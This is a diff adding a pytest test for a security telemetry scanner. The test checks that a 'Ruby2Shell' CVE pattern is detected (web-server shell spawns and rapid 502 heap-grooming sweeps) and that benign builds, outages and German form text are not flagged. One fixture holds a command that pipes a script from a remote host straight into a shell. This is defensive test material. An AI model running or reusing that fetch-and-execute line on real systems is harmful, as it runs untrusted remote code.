@@ -1472,6 +1472,201 @@ def test_suricata_eve_meta_dedup_zeek_mdns_filter_and_host_port_oob_join(tmp_pat
     assert any("dns_oob_callback_after_probe" in c.reasons for c in scan_telemetry_file(ipv6_oob))
 
 
+def test_ruby2shell_parent_shell_spawn_and_5xx_heap_grooming_zero_fp(tmp_path: Path) -> None:
+    """Ruby2Shell (CVE-2026-132825): verify puma/ruby shell-spawn & Zero-IOC 5xx heap-grooming TP with 0 FP on benign builds/outages/German text."""
+    # 1. TP: Puma dedicated Ruby app server spawning /bin/sh -> web_parent_shell_spawn (alert)
+    p_puma = tmp_path / "puma_rce.jsonl"
+    p_puma.write_text(
+        json.dumps(
+            {
+                "timestamp": "2026-11-23T21:00:00Z",
+                "source_host": "gitlab-prod-01",
+                "actor": "git",
+                "event_type": "process",
+                "surface": "endpoint",
+                "parent_process": "/opt/gitlab/embedded/bin/puma",
+                "process": "/bin/sh",
+                "command_line": "sh -c id",
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    c_puma = scan_telemetry_file(p_puma)
+    assert c_puma and "web_parent_shell_spawn" in c_puma[0].reasons and c_puma[0].alert_tier == "alert"
+
+    # 2. TP: ruby runtime spawning suspicious curl pipe shell -> web_parent_shell_spawn (alert)
+    p_ruby_bad = tmp_path / "ruby_rce.jsonl"
+    p_ruby_bad.write_text(
+        json.dumps(
+            {
+                "timestamp": "2026-11-23T21:00:05Z",
+                "source_host": "rails-web-02",
+                "actor": "deploy",
+                "event_type": "process",
+                "surface": "endpoint",
+                "parent_process": "/usr/bin/ruby",
+                "process": "/bin/bash",
+                "command_line": "bash -c 'curl -s http://198.51.100.20/s | sh'",
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    c_ruby_bad = scan_telemetry_file(p_ruby_bad)
+    assert c_ruby_bad and "web_parent_shell_spawn" in c_ruby_bad[0].reasons
+
+    # 3. TN (0 FP): Benign ruby build/test invoking shell (bundle exec rake test) -> 0 candidates
+    p_ruby_ok = tmp_path / "ruby_benign.jsonl"
+    p_ruby_ok.write_text(
+        json.dumps(
+            {
+                "timestamp": "2026-11-23T21:00:10Z",
+                "source_host": "ci-runner-01",
+                "actor": "ci",
+                "event_type": "process",
+                "surface": "endpoint",
+                "parent_process": "/usr/bin/ruby",
+                "process": "/bin/sh",
+                "command_line": "sh -c 'git rev-parse --short HEAD'",
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    assert scan_telemetry_file(p_ruby_ok) == []
+
+    # 4. TP (Zero-IOC): Rapid 502 worker crash-loop across 3 distinct POST sizes -> 200 recovery (zero charset/0xDF strings!)
+    p_groom = tmp_path / "heap_groom_5xx.jsonl"
+    groom_rows = [
+        {"timestamp": "2026-11-23T21:01:00.0Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 64, "status_code": 502},
+        {"timestamp": "2026-11-23T21:01:00.4Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 128, "status_code": 502},
+        {"timestamp": "2026-11-23T21:01:00.8Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 256, "status_code": 502},
+        {"timestamp": "2026-11-23T21:01:01.2Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 384, "status_code": 200},
+    ]
+    p_groom.write_text("\n".join(json.dumps(r) for r in groom_rows) + "\n", encoding="utf-8")
+    c_groom = scan_telemetry_file(p_groom)
+    assert c_groom and "web_memory_corruption_crash_loop" in c_groom[0].reasons and c_groom[0].alert_tier == "alert"
+
+    # 5. TN (0 FP): Slow human Rails deployment 502 outage across distinct sizes -> 200 recovery (>3s pacing) -> 0 web_memory_corruption_crash_loop
+    p_outage = tmp_path / "benign_deploy_outage.jsonl"
+    outage_rows = [
+        {"timestamp": "2026-11-23T21:02:00Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 64, "status_code": 502},
+        {"timestamp": "2026-11-23T21:02:06Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 128, "status_code": 502},
+        {"timestamp": "2026-11-23T21:02:14Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 256, "status_code": 502},
+        {"timestamp": "2026-11-23T21:02:23Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 384, "status_code": 200},
+    ]
+    p_outage.write_text("\n".join(json.dumps(r) for r in outage_rows) + "\n", encoding="utf-8")
+    assert scan_telemetry_file(p_outage) == []
+
+    # 6. TN (0 FP): Legitimate German ISO-8859-1 form POST containing single 'ß' ("Straße") -> 0 candidates
+    p_german = tmp_path / "benign_german_iso8859.jsonl"
+    p_german.write_text(
+        json.dumps(
+            {
+                "timestamp": "2026-11-23T21:03:00Z",
+                "source_host": "10.20.0.22",
+                "event_type": "http",
+                "surface": "web_portal",
+                "dest_host": "rails.corp.local",
+                "http_method": "POST",
+                "http_path": "/api/v1/rails-form",
+                "status_code": 200,
+                "raw_json": {"content_type": "application/x-www-form-urlencoded; charset=iso-8859-1", "body": "street=Hauptstraße+12"},
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    assert scan_telemetry_file(p_german) == []
+
+    # 7. TN (0 FP): Path-substring FP guard — /home/passenger/app/deploy.sh, /usr/bin/passenger-config, /srv/puma-docs/build.sh
+    p_substr = tmp_path / "benign_parent_substrings.jsonl"
+    p_substr.write_text(
+        "\n".join(
+            json.dumps(r)
+            for r in [
+                {"timestamp": "2026-11-23T21:04:00Z", "source_host": "dev-01", "actor": "dev", "event_type": "process", "surface": "endpoint", "parent_process": "/home/passenger/app/deploy.sh", "process": "/bin/sh", "command_line": "sh -c 'git pull --ff-only'"},
+                {"timestamp": "2026-11-23T21:04:05Z", "source_host": "dev-01", "actor": "dev", "event_type": "process", "surface": "endpoint", "parent_process": "/usr/bin/passenger-config", "process": "/bin/sh", "command_line": "sh -c 'which ruby'"},
+                {"timestamp": "2026-11-23T21:04:10Z", "source_host": "dev-01", "actor": "dev", "event_type": "process", "surface": "endpoint", "parent_process": "/srv/puma-docs/build.sh", "process": "/bin/bash", "command_line": "bash -c 'mkdocs build'"},
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    assert scan_telemetry_file(p_substr) == []
+
+    # 8. TN (0 FP): Security research URLs & CLI greps mentioning CVE-2026-132825 / ruby2shell must NOT alert!
+    p_research = tmp_path / "benign_cve_research.jsonl"
+    p_research.write_text(
+        "\n".join(
+            json.dumps(r)
+            for r in [
+                {"timestamp": "2026-11-23T21:05:00Z", "source_host": "10.30.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "nvd.example", "http_method": "GET", "http_path": "/vuln/detail/CVE-2026-132825", "status_code": 200},
+                {"timestamp": "2026-11-23T21:05:04Z", "source_host": "10.30.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "blog.example", "http_method": "GET", "http_path": "/posts/ruby2shell-analysis", "status_code": 200},
+                {"timestamp": "2026-11-23T21:05:10Z", "source_host": "sec-01", "actor": "analyst", "event_type": "process", "surface": "endpoint", "process": "/usr/bin/rg", "command_line": "rg CVE-2026-132825 docs/"},
+                {"timestamp": "2026-11-23T21:05:15Z", "source_host": "sec-01", "actor": "analyst", "event_type": "process", "surface": "endpoint", "process": "/usr/bin/git", "command_line": "git log --grep=ruby2shell"},
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    assert scan_telemetry_file(p_research) == []
+
+    # 9. TP: JSON-escaped \u00df\u00df\u00df\u00df (default Python json.dumps ensure_ascii=True) under ISO-8859-1 must fire!
+    p_u00df = tmp_path / "r2s_u00df_escaped.jsonl"
+    p_u00df.write_text(
+        "\n".join(
+            json.dumps(r, ensure_ascii=True)
+            for r in [
+                {"timestamp": "2026-11-23T21:06:00Z", "source_host": "198.51.100.90", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "status_code": 502, "raw_json": {"content_type": "application/x-www-form-urlencoded; charset=iso-8859-1", "body": "q=\u00df\u00df\u00df\u00df\u00df\u00df"}},
+                {"timestamp": "2026-11-23T21:06:01Z", "source_host": "198.51.100.90", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "status_code": 502, "raw_json": {"content_type": "application/x-www-form-urlencoded; charset=iso-8859-1", "body": "q=\u00df\u00df\u00df\u00df\u00df\u00dfAA"}},
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    c_u00df = scan_telemetry_file(p_u00df)
+    assert c_u00df and "web_memory_corruption_crash_loop" in c_u00df[0].reasons
+
+    # 10. TN (0 FP): Busy API client hitting non-monotonic random-size POSTs during a 502/503 deploy blip -> 0 web_memory_corruption_crash_loop
+    p_blip = tmp_path / "busy_api_blip.jsonl"
+    p_blip.write_text(
+        "\n".join(
+            json.dumps(r)
+            for r in [
+                {"timestamp": "2026-11-23T21:07:00.0Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 240, "status_code": 502},
+                {"timestamp": "2026-11-23T21:07:00.5Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 190, "status_code": 502},
+                {"timestamp": "2026-11-23T21:07:01.0Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 310, "status_code": 503},
+                {"timestamp": "2026-11-23T21:07:01.5Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 215, "status_code": 200},
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    assert all("web_memory_corruption_crash_loop" not in c.reasons for c in scan_telemetry_file(p_blip))
+
+    # 11. TP: Slow-prefix evasion resistance — 2 slow GETs (10s apart) before a rapid monotonic 502 heap-grooming sweep MUST still fire!
+    p_slow_pre = tmp_path / "slow_prefix_heap_groom.jsonl"
+    p_slow_pre.write_text(
+        "\n".join(
+            json.dumps(r)
+            for r in [
+                {"timestamp": "2026-11-23T21:08:00.0Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "GET", "http_path": "/", "status_code": 200},
+                {"timestamp": "2026-11-23T21:08:10.0Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "GET", "http_path": "/about", "status_code": 200},
+                {"timestamp": "2026-11-23T21:08:20.0Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 64, "status_code": 502},
+                {"timestamp": "2026-11-23T21:08:20.1Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 128, "status_code": 502},
+                {"timestamp": "2026-11-23T21:08:20.2Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 256, "status_code": 502},
+                {"timestamp": "2026-11-23T21:08:20.3Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 384, "status_code": 200},
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    c_slow_pre = scan_telemetry_file(p_slow_pre)
+    assert c_slow_pre and "web_memory_corruption_crash_loop" in c_slow_pre[0].reasons
+
+
 
 
 
